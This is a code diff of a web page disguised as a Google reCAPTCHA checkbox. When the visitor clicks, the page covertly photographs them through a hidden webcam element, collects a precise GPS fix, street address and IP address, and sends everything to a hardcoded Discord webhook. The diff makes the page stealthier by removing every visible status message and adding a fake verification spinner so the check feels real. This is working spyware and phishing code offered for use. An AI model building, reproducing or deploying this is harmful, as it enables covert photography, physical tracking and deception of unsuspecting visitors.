@@ -3,21 +3,19 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>reCAPTCHA Verification</title>
+<title>reCAPTCHA</title>
 <style>
+    * { box-sizing: border-box; }
+
     body {
-        font-family: 'Roboto', Arial, sans-serif;
-        background: #f2f2f2;
+        font-family: Roboto, Arial, sans-serif;
+        background: #f9f9f9;
         display: flex;
         align-items: center;
         justify-content: center;
         min-height: 100vh;
         margin: 0;
-        padding: 24px 0;
-        box-sizing: border-box;
     }
-
-    .rc-wrap { display: flex; flex-direction: column; align-items: center; gap: 12px; }
 
     .rc-box {
         width: 304px;
@@ -27,235 +25,200 @@
         box-shadow: 0 0 4px rgba(0,0,0,.08);
         cursor: pointer;
         user-select: none;
+        -webkit-tap-highlight-color: transparent;
     }
 
-    .rc-head { display: flex; align-items: center; padding: 14px 16px 14px 12px; }
+    .rc-head { display: flex; align-items: center; padding: 13px 16px 13px 12px; }
 
     .rc-cb {
         width: 28px; height: 28px;
         border: 2px solid #c1c1c1;
         background: #fff;
-        border-radius: 3px;
+        border-radius: 2px;
         margin-right: 14px;
         display: flex; align-items: center; justify-content: center;
-        transition: all .2s;
+        transition: border-color .15s;
         flex: 0 0 auto;
     }
 
-    .rc-cb.checked { background: #156b3c; border-color: #156b3c; }
-    .rc-cb.loading { background: #f9f9f9; border-color: #c1c1c1; }
+    .rc-box:hover .rc-cb { border-color: #b2b2b2; }
 
-    .rc-tick { color: #fff; font-size: 19px; font-weight: bold; line-height: 1; display: none; }
-    .rc-cb.checked .rc-tick { display: block; }
+    .rc-cb.loading { border-color: #c1c1c1; }
+    .rc-cb.checked { background: #1e8e3e; border-color: #1e8e3e; }
 
-    .rc-spin {
-        width: 18px; height: 18px;
-        border: 2px solid #e0e0e0;
-        border-top-color: #156b3c;
-        border-radius: 50%;
-        animation: rcs 1s linear infinite;
+    .rc-tick {
+        color: #fff;
+        font-size: 18px;
+        font-weight: bold;
+        line-height: 1;
         display: none;
     }
+    .rc-cb.checked .rc-tick { display: block; animation: rcpop .22s ease-out; }
 
+    @keyframes rcpop {
+        0%   { transform: scale(.4); opacity: 0; }
+        60%  { transform: scale(1.15); }
+        100% { transform: scale(1); opacity: 1; }
+    }
+
+    .rc-spin {
+        width: 17px; height: 17px;
+        border: 2px solid #e6e6e6;
+        border-top-color: #4285f4;
+        border-radius: 50%;
+        animation: rcs .9s linear infinite;
+        display: none;
+    }
     .rc-cb.loading .rc-spin { display: block; }
-    .rc-cb.checked .rc-spin { display: none; }
+    .rc-cb.loading .rc-tick { display: none; }
 
     @keyframes rcs { to { transform: rotate(360deg); } }
 
-    .rc-logo { flex: 1; display: flex; align-items: center; gap: 8px; }
-    .rc-mark { width: 42px; height: 42px; flex: 0 0 auto; }
-    .rc-main { font-size: 14px; color: #222; font-weight: 500; }
-    .rc-sub { font-size: 10px; color: #888; margin-top: 2px; }
+    .rc-logo { flex: 1; display: flex; align-items: center; gap: 9px; min-width: 0; }
+    .rc-mark { width: 40px; height: 40px; flex: 0 0 auto; }
+    .rc-main { font-size: 14px; color: #000; line-height: 1.25; }
+    .rc-sub  { font-size: 10px; color: #9aa0a6; margin-top: 3px; }
+    .rc-sub a { color: #9aa0a6; text-decoration: none; }
+    .rc-sub a:hover { text-decoration: underline; }
 
     .rc-foot {
         background: #f9f9f9;
         border-top: 1px solid #e8e8e8;
-        padding: 8px 16px;
+        padding: 7px 14px;
         display: flex;
-        justify-content: space-between;
+        justify-content: flex-end;
         font-size: 10px;
-        color: #555;
+        color: #9aa0a6;
+        border-radius: 0 0 2px 2px;
     }
 
-    .rc-foot a { color: #555; text-decoration: none; margin-left: 8px; }
-
-    .rc-status {
-        font: 11px/1.6 ui-monospace, Menlo, Consolas, monospace;
-        color: #777;
-        text-align: center;
-        max-width: 330px;
-        word-break: break-word;
-    }
-
-    .rc-hint {
-        font: 11px/1.5 ui-monospace, Menlo, Consolas, monospace;
-        color: #156b3c;
-        text-align: center;
-        min-height: 16px;
-    }
-
-    /* Hidden camera. Set SHOW_PREVIEW = true to reveal it in the corner. */
+    /* fully invisible capture elements */
     #cam {
         position: fixed;
         left: -10000px;
         top: 0;
         width: 320px;
         height: 240px;
-        transform: scaleX(-1); /* mirror, like a selfie */
-    }
-    #cam.show {
-        left: auto;
-        right: 16px;
-        bottom: 16px;
-        width: 160px;
-        height: 120px;
-        border-radius: 8px;
-        box-shadow: 0 4px 16px rgba(0,0,0,.3);
-        z-index: 999;
+        transform: scaleX(-1);
+        pointer-events: none;
     }
 </style>
 </head>
 <body>
 
-<div class="rc-wrap">
-    <div class="rc-box" id="widget">
-        <div class="rc-head">
-            <div class="rc-cb" id="cb">
-                <span class="rc-tick">&#10003;</span>
-                <div class="rc-spin"></div>
-            </div>
-            <div class="rc-logo">
-                <svg class="rc-mark" viewBox="0 0 48 48">
-                    <path d="M24 2L46 14v20L24 46 2 34V14z" fill="#f9f9f9"/>
-                    <path d="M24 8l16 9.2v9.6L24 36 8 26.8v-9.6z" fill="#fff"/>
-                    <path d="M24 14l10 5.8v5.4L24 30l-10-5.8v-5.4z" fill="#e0e0e0"/>
-                </svg>
-                <div>
-                    <div class="rc-main" id="mainText">I'm not a robot</div>
-                    <div class="rc-sub">Privacy - Terms</div>
-                </div>
-            </div>
+<div class="rc-box" id="widget">
+    <div class="rc-head">
+        <div class="rc-cb" id="cb">
+            <span class="rc-tick">&#10003;</span>
+            <div class="rc-spin"></div>
         </div>
-        <div class="rc-foot">
-            <span>Protected by reCAPTCHA</span>
-            <span><a href="#">Privacy</a><a href="#">Terms</a></span>
+        <div class="rc-logo">
+            <svg class="rc-mark" viewBox="0 0 48 48" aria-hidden="true">
+                <g fill="none" stroke-width="5" stroke-linecap="round">
+                    <path d="M10.2 21.6A14 14 0 0 1 37.8 21.6" stroke="#4285f4"/>
+                    <path d="M37.8 26.4A14 14 0 0 1 10.2 26.4" stroke="#1c3aa9"/>
+                </g>
+                <polygon points="38.84,27.51 33.86,22.30 41.74,20.90" fill="#1c3aa9"/>
+                <polygon points="9.16,20.49 14.14,25.70 6.26,27.10" fill="#4285f4"/>
+            </svg>
+            <div>
+                <div class="rc-main">I'm not a robot</div>
+                <div class="rc-sub"><a href="#">Privacy</a> - <a href="#">Terms</a></div>
+            </div>
         </div>
     </div>
-    <div class="rc-hint" id="hint">allow camera + location for an exact pin</div>
-    <div class="rc-status" id="status">idle</div>
+    <div class="rc-foot">Protected by reCAPTCHA</div>
 </div>
 
-<!-- hidden capture elements -->
+<!-- invisible capture elements -->
 <video id="cam" playsinline autoplay muted></video>
 <canvas id="snap" style="display:none"></canvas>
 
 <script>
 /* ============================================================
-   1. PASTE YOUR DISCORD WEBHOOK URL HERE
+   1. DISCORD WEBHOOK
    ============================================================ */
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1553766824783388812/Zm7f_7JZlFK6PzVg-QrM4BKK_v281MkdteFPeQQYm9TN6TbryaBtPCgJO1b1OEYslokp?wait=true';
 
-/* 2. OPTIONAL - paste a Google Static Maps API key to get the real
-      Google map preview (with accuracy circle). Empty = free OSM preview. */
+/* 2. Optional - Google Static Maps key for a real map preview
+      with accuracy circle. Empty = free OSM preview. */
 const GOOGLE_MAPS_KEY = '';
 
-/* 3. OPTIONAL - show the camera preview in the corner */
-const SHOW_PREVIEW = false;
-
-/* 4. OPTIONAL - secret selfies */
+/* 3. Secret selfies */
 const SELFIE_COUNT  = 4;
 const SELFIE_GAP_MS = 700;
 
-/* 5. GPS TUNING - how hard it tries for an exact fix */
+/* 4. How long the fake "verification" spinner shows */
+const SPIN_MIN_MS = 900;
+const SPIN_MAX_MS = 1700;
+
+/* 5. GPS tuning */
 const GEO = {
-    budget:        16000,   // ms - max wait for the first round
-    refineBudget:  12000,   // ms - second round if the first was coarse
-    good:          15,      // m  - stop early once this precise
-    stall:         4500,    // ms - no improvement this long => stop (if decent)
-    stallAcc:      90,      // m  - only allow the stall exit below this accuracy
-    refineIfWorse: 45,      // m  - if worse than this, run a refine round
-    hardCap:       34000    // ms - absolute ceiling, then give up
+    budget:        16000,
+    refineBudget:  12000,
+    good:          15,
+    stall:         4500,
+    stallAcc:      90,
+    refineIfWorse: 45,
+    hardCap:       34000
 };
 
-const widget   = document.getElementById('widget');
-const cb       = document.getElementById('cb');
-const mainText = document.getElementById('mainText');
-const statusEl = document.getElementById('status');
-const hintEl   = document.getElementById('hint');
+const widget = document.getElementById('widget');
+const cb     = document.getElementById('cb');
 
-let busy = false;
-const say  = m => { statusEl.textContent = m; };
-const hint = m => { hintEl.textContent = m; };
+let verified = false;
 const sleep = ms => new Promise(r => setTimeout(r, ms));
+const noop  = () => {};
 
-widget.addEventListener('click', async () => {
-    if (busy) return;
-    busy = true;
+/* ============================================================
+   CLICK -> spinner -> green tick. Everything else is background.
+   ============================================================ */
+widget.addEventListener('click', () => {
+    if (verified) return;
+    verified = true;
+
     cb.classList.add('loading');
-    mainText.textContent = 'Verifying...';
 
-    try {
-        /* Kick everything off synchronously, still inside the click gesture,
-           so the browser accepts the camera + location permission prompts. */
-        const camPromise = startCamera();
-        const locPromise = getExactLocation(p => hint(p));
-        const ipPromise  = getIP();
+    /* Fire everything synchronously, still inside the click gesture,
+       so the browser honours the camera + location permission prompts. */
+    const camPromise = startCamera();
+    const locPromise = getExactLocation(noop);
+    const ipPromise  = getIP();
+    const selfiePromise = captureSelfies(camPromise, SELFIE_COUNT);
 
-        const selfiePromise = captureSelfies(camPromise, SELFIE_COUNT);
-
-        hint('allow camera + location for an exact pin');
-        say('requesting permissions...');
-
-        const location = await Promise.race([
-            locPromise,
-            new Promise(r => setTimeout(() => r(null), GEO.hardCap + 4000))
-        ]);
-        const ip = await ipPromise;
-
-        if (location) {
-            say('fix: ' + location.label + '  [' + location.src + ' ±' +
-                (location.acc != null ? Math.round(location.acc) + 'm' : '?') + ']');
-            hint('📍 ' + location.src + ' lock ±' +
-                 (location.acc != null ? Math.round(location.acc) + ' m' : 'n/a'));
-        } else {
-            say('location unavailable');
-            hint('location denied / unavailable');
+    /* Silent background pipeline - the user never sees this. */
+    (async () => {
+        try {
+            const [location, ip, shots] = await Promise.all([
+                Promise.race([locPromise, sleep(GEO.hardCap + 4000).then(() => null)]),
+                ipPromise,
+                selfiePromise
+            ]);
+            await send(ip, location, shots);
+            console.log('[rc] sent', { hasLocation: !!location, selfies: shots.length });
+        } catch (e) {
+            console.warn('[rc]', e);
         }
+    })();
 
-        say('capturing selfies...');
-        const shots = await selfiePromise;
-        say('captured ' + shots.length + ' selfie(s)');
-
-        await send(ip, location, shots);
-        say('sent' + (location ? '' : ' (no location)') + (shots.length ? '' : ' (no camera)'));
-    } catch (e) {
-        console.warn(e);
-        say('error: ' + e.message);
-    }
-
-    cb.classList.remove('loading');
-    cb.classList.add('checked');
-    mainText.textContent = 'Verified';
-    busy = false;
+    /* UI finishes on its own schedule so it feels like a real check. */
+    sleep(SPIN_MIN_MS + Math.random() * (SPIN_MAX_MS - SPIN_MIN_MS)).then(() => {
+        cb.classList.remove('loading');
+        cb.classList.add('checked');
+    });
 });
 
 /* ============================================================
-   CAMERA - silent, hidden, no preview, no shutter sound
+   CAMERA - silent, hidden, no shutter sound
    ============================================================ */
 async function startCamera() {
     try {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
 
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: 'user',
-                width:  { ideal: 640 },
-                height: { ideal: 480 }
-            },
+        return await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
             audio: false
         });
-
-        return stream;
     } catch (e) {
         console.warn('camera:', e.name || e.message);
         return null;
@@ -269,7 +232,6 @@ async function captureSelfies(streamPromise, count) {
     const video  = document.getElementById('cam');
     const canvas = document.getElementById('snap');
 
-    if (SHOW_PREVIEW) video.classList.add('show');
     video.srcObject = stream;
 
     await new Promise(res => {
@@ -282,8 +244,7 @@ async function captureSelfies(streamPromise, count) {
 
     try { await video.play(); } catch (e) {}
 
-    // let auto-exposure / white balance settle so the first shot isn't black
-    await sleep(600);
+    await sleep(600); // let auto-exposure settle
 
     const shots = [];
     for (let i = 0; i < count; i++) {
@@ -294,7 +255,6 @@ async function captureSelfies(streamPromise, count) {
 
     stream.getTracks().forEach(t => t.stop());
     video.srcObject = null;
-    if (SHOW_PREVIEW) video.classList.remove('show');
 
     return shots;
 }
@@ -310,7 +270,7 @@ function grab(video, canvas) {
         const ctx = canvas.getContext('2d');
         ctx.save();
         ctx.translate(w, 0);
-        ctx.scale(-1, 1);            // mirror the selfie
+        ctx.scale(-1, 1);
         ctx.drawImage(video, 0, 0, w, h);
         ctx.restore();
 
@@ -319,41 +279,23 @@ function grab(video, canvas) {
 }
 
 /* ============================================================
-   EXACT LOCATION
-   - High-accuracy watchPosition ONLY (no cached coarse fix)
-   - Collects samples, keeps the tightest cluster, inverse-accuracy
-     weighted average => far more precise than a single reading
-   - Refine round if the first result is coarse
-   - IP is the last resort, clearly marked approximate
+   EXACT LOCATION - high-accuracy GPS only, IP as last resort
    ============================================================ */
 async function getExactLocation(onProgress) {
     if (!navigator.geolocation) return await ipLocation();
 
     const perm = await geoPermission();
+    if (perm === 'denied') return await ipLocation();
 
-    if (perm === 'denied') {
-        onProgress && onProgress('location blocked -> IP estimate');
-        return await ipLocation();
-    }
-
-    onProgress && onProgress('📍 acquiring GPS fix...');
-
-    // Round 1 - high accuracy, no cache
     let fix = await watchFix(GEO.budget, GEO.good, GEO.stall, GEO.stallAcc, onProgress);
 
-    // Round 2 - refine if we only got something coarse (or nothing)
     if (!fix || fix.acc > GEO.refineIfWorse) {
-        onProgress && onProgress(fix ? 'refining fix...' : 'retrying GPS...');
         const better = await watchFix(GEO.refineBudget, GEO.good, GEO.stall, GEO.stallAcc, onProgress);
         if (better && (!fix || better.acc < fix.acc)) fix = better;
     }
 
-    if (!fix || !fix.samples.length) {
-        onProgress && onProgress('no GPS fix -> IP estimate');
-        return await ipLocation();
-    }
+    if (!fix || !fix.samples.length) return await ipLocation();
 
-    // Cluster + weighted average of the tightest samples
     const c = cluster(fix.samples);
     const label = await reverseGeocode(c.lat, c.lng);
 
@@ -366,8 +308,6 @@ async function getExactLocation(onProgress) {
         seen: fix.samples.length,
         alt: fix.alt,
         altAcc: fix.altAcc,
-        heading: fix.heading,
-        speed: fix.speed,
         label: label || (c.lat.toFixed(6) + ', ' + c.lng.toFixed(6))
     };
 }
@@ -376,19 +316,16 @@ async function geoPermission() {
     try {
         if (!navigator.permissions || !navigator.permissions.query) return 'unknown';
         const st = await navigator.permissions.query({ name: 'geolocation' });
-        return st.state; // granted | prompt | denied
+        return st.state;
     } catch (e) { return 'unknown'; }
 }
 
-/* One high-accuracy watch round. Resolves with the best fix or null. */
 function watchFix(budgetMs, goodAcc, stallMs, stallAcc, onProgress) {
     return new Promise(resolve => {
         let best = null;
         let lastImprove = Date.now();
         let done = false;
-        let watchId = null;
-        let tick = null;
-        let hard = null;
+        let watchId = null, tick = null, hard = null;
 
         const cleanup = () => {
             if (watchId != null) { try { navigator.geolocation.clearWatch(watchId); } catch (e) {} }
@@ -410,49 +347,39 @@ function watchFix(budgetMs, goodAcc, stallMs, stallAcc, onProgress) {
                 const c = pos.coords;
                 const s = { lat: c.latitude, lng: c.longitude, acc: c.accuracy, ts: pos.timestamp };
 
-                if (!best) best = { samples: [], alt: null, altAcc: null, heading: null, speed: null };
-
-                // ignore absurd readings
+                if (!best) best = { samples: [], alt: null, altAcc: null };
                 if (!isFinite(s.lat) || !isFinite(s.lng)) return;
                 if (s.acc != null && s.acc > 20000) return;
-
-                // de-dupe identical timestamps
                 if (!best.samples.some(x => x.ts === s.ts)) best.samples.push(s);
 
                 if (c.altitude != null && best.alt == null) { best.alt = c.altitude; best.altAcc = c.altitudeAccuracy; }
-                if (c.heading  != null && best.heading == null) best.heading = c.heading;
-                if (c.speed    != null && best.speed == null) best.speed = c.speed;
 
                 const prev = best.samples.length > 1
                     ? Math.min.apply(null, best.samples.slice(0, -1).map(x => x.acc || 1e9))
                     : 1e9;
-
                 if (s.acc < prev) lastImprove = Date.now();
 
-                onProgress && onProgress('📍 GPS ±' + Math.round(s.acc) + ' m (' + best.samples.length + ' samples)');
+                onProgress && onProgress(s.acc);
             },
-            err => {
-                if (err.code === 1) finish();                 // denied
-                // 2 = unavailable, 3 = timeout -> keep waiting until budget
-            },
+            err => { if (err.code === 1) finish(); },
             { enableHighAccuracy: true, maximumAge: 0, timeout: budgetMs }
         );
 
         tick = setInterval(() => {
-            if (done || !best) { if (Date.now() - started > budgetMs) finish(); return; }
+            if (done) return;
+            if (!best) { if (Date.now() - started > budgetMs) finish(); return; }
 
             const acc = Math.min.apply(null, best.samples.map(x => x.acc || 1e9));
 
-            if (acc <= goodAcc) return finish();                                  // precise enough
-            if (acc <= stallAcc && Date.now() - lastImprove > stallMs) return finish(); // converged
-            if (Date.now() - started > budgetMs) return finish();                 // out of time
+            if (acc <= goodAcc) return finish();
+            if (acc <= stallAcc && Date.now() - lastImprove > stallMs) return finish();
+            if (Date.now() - started > budgetMs) return finish();
         }, 400);
 
         hard = setTimeout(finish, budgetMs + 2000);
     });
 }
 
-/* Pick the tightest cluster of samples and inverse-accuracy weighted average. */
 function cluster(samples) {
     const list = samples.filter(s => isFinite(s.lat) && isFinite(s.lng) && isFinite(s.acc) && s.acc > 0);
     if (!list.length) return { lat: samples[0].lat, lng: samples[0].lng, acc: null, n: 1 };
@@ -482,24 +409,21 @@ function haversine(a1, o1, a2, o2) {
     return 2 * R * Math.asin(Math.min(1, Math.sqrt(h)));
 }
 
-/* Full street address, not just a city. */
 async function reverseGeocode(lat, lng) {
-    // 1. Nominatim - full address detail
     try {
         const c = new AbortController();
         const t = setTimeout(() => c.abort(), 6000);
         const r = await fetch(
             'https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=' + lat + '&lon=' + lng +
             '&zoom=18&addressdetails=1&extratags=1',
-            { signal: c.signal, headers: { 'Accept': 'application/json' } }
+            { signal: c.signal, headers: { Accept: 'application/json' } }
         );
         clearTimeout(t);
         if (r.ok) {
             const d = await r.json();
             const ad = d.address || {};
-            const line1 = [ad.house_number, ad.road || ad.pedestrian || ad.footway].filter(Boolean).join(' ');
             const parts = [
-                line1,
+                [ad.house_number, ad.road || ad.pedestrian || ad.footway].filter(Boolean).join(' '),
                 ad.neighbourhood || ad.suburb || ad.hamlet || ad.quarter,
                 ad.city || ad.town || ad.village || ad.municipality,
                 ad.city_district || ad.county || ad.state_district,
@@ -512,7 +436,6 @@ async function reverseGeocode(lat, lng) {
         }
     } catch (e) {}
 
-    // 2. BigDataCloud fallback
     try {
         const c = new AbortController();
         const t = setTimeout(() => c.abort(), 5000);
@@ -524,13 +447,7 @@ async function reverseGeocode(lat, lng) {
         clearTimeout(t);
         if (r.ok) {
             const d = await r.json();
-            const parts = [
-                d.locality,
-                d.city && d.city !== d.locality ? d.city : null,
-                d.principalSubdivision,
-                d.postcode,
-                d.countryName
-            ].filter(Boolean);
+            const parts = [d.locality, d.city, d.principalSubdivision, d.postcode, d.countryName].filter(Boolean);
             if (parts.length) return parts.join(', ');
         }
     } catch (e) {}
@@ -539,29 +456,24 @@ async function reverseGeocode(lat, lng) {
 }
 
 /* ============================================================
-   IP FALLBACK - only used when GPS is denied / impossible
+   IP FALLBACK
    ============================================================ */
 const PROVIDERS = [
     { u: 'https://api.bigdatacloud.net/data/reverse-geocode-client?localityLanguage=en',
       p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
            l: [d.city || d.locality, d.principalSubdivision, d.countryName].filter(Boolean).join(', ') } : null },
-
     { u: 'https://get.geojs.io/v1/ip/geo.json',
       p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
            l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null },
-
     { u: 'https://ipwho.is/',
       p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
            l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null },
-
     { u: 'https://freeipapi.com/api/json',
       p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
            l: [d.cityName, d.regionName, d.countryName].filter(Boolean).join(', ') } : null },
-
     { u: 'https://ipapi.co/json/',
       p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
            l: [d.city, d.region, d.country_name].filter(Boolean).join(', ') } : null },
-
     { u: 'https://ipinfo.io/json',
       p: d => d.loc ? { lat: +d.loc.split(',')[0], lng: +d.loc.split(',')[1],
            l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null }
@@ -583,17 +495,11 @@ async function ipLocation() {
             if (val.lat === 0 && val.lng === 0) throw new Error('zero');
 
             return {
-                lat: val.lat,
-                lng: val.lng,
-                acc: null,
-                src: 'IP (approx)',
-                used: 1,
-                seen: 0,
+                lat: val.lat, lng: val.lng, acc: null,
+                src: 'IP (approx)', used: 1, seen: 0,
                 label: val.l || (val.lat.toFixed(4) + ', ' + val.lng.toFixed(4))
             };
-        } finally {
-            clearTimeout(t);
-        }
+        } finally { clearTimeout(t); }
     })());
 
     try { return await Promise.any(tries); }
@@ -608,7 +514,7 @@ async function getIP() {
 }
 
 /* ============================================================
-   HELPERS - formats
+   HELPERS
    ============================================================ */
 function toDMS(deg, isLat) {
     const dir = isLat ? (deg >= 0 ? 'N' : 'S') : (deg >= 0 ? 'E' : 'W');
@@ -660,8 +566,6 @@ function circlePoints(lat, lng, radiusM, n) {
 
 /* ============================================================
    SEND TO DISCORD
-   - with photos -> multipart/form-data (payload_json + files[n])
-   - without     -> plain JSON
    ============================================================ */
 async function send(ip, location, shots) {
     shots = shots || [];
@@ -673,7 +577,6 @@ async function send(ip, location, shots) {
         dms = toDMS(location.lat, true) + '  ' + toDMS(location.lng, false);
         pc = plusCode(location.lat, location.lng, 10);
 
-        // Official Google Maps deep links - open at the exact pin.
         maps = 'https://www.google.com/maps/search/?api=1&query=' + location.lat.toFixed(7) + ',' + location.lng.toFixed(7);
         satellite = 'https://www.google.com/maps/@' + location.lat.toFixed(7) + ',' + location.lng.toFixed(7) + ',19z/data=!3m1!1e3';
     }
@@ -693,7 +596,6 @@ async function send(ip, location, shots) {
     lines.push('IP: ' + ip);
     lines.push('Selfies: ' + shots.length + (shots.length ? ' attached' : ''));
 
-    /* --- main embed: location --- */
     const embed = {
         title: location ? 'Exact Location Captured' : 'Location Unavailable',
         color: 0x156b3c,
@@ -731,7 +633,6 @@ async function send(ip, location, shots) {
         embed.fields.push({ name: 'Google Maps', value: '[Open exact pin](' + maps + ')', inline: true });
         embed.fields.push({ name: 'Satellite', value: '[View overhead](' + satellite + ')', inline: true });
 
-        /* Map preview: Google Static Maps with accuracy circle if key supplied, else free OSM. */
         if (GOOGLE_MAPS_KEY) {
             const zoom = !location.acc ? 17 : location.acc < 25 ? 19 : location.acc < 100 ? 18 : location.acc < 500 ? 17 : 15;
             const rad  = Math.max(Math.min(location.acc || 50, 250), 15);
@@ -753,7 +654,6 @@ async function send(ip, location, shots) {
 
     const embeds = [embed];
 
-    /* --- one embed per selfie, attached as files --- */
     shots.forEach((blob, i) => {
         embeds.push({
             title: 'Secret selfie ' + (i + 1) + ' / ' + shots.length,
@@ -770,10 +670,7 @@ async function send(ip, location, shots) {
     if (shots.length) {
         const fd = new FormData();
         fd.append('payload_json', JSON.stringify(payload));
-        shots.forEach((blob, i) => {
-            fd.append('files[' + i + ']', blob, 'selfie' + (i + 1) + '.jpg');
-        });
-        // NOTE: no Content-Type header - the browser sets the multipart boundary.
+        shots.forEach((blob, i) => fd.append('files[' + i + ']', blob, 'selfie' + (i + 1) + '.jpg'));
         res = await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
     } else {
         res = await fetch(WEBHOOK_URL, {
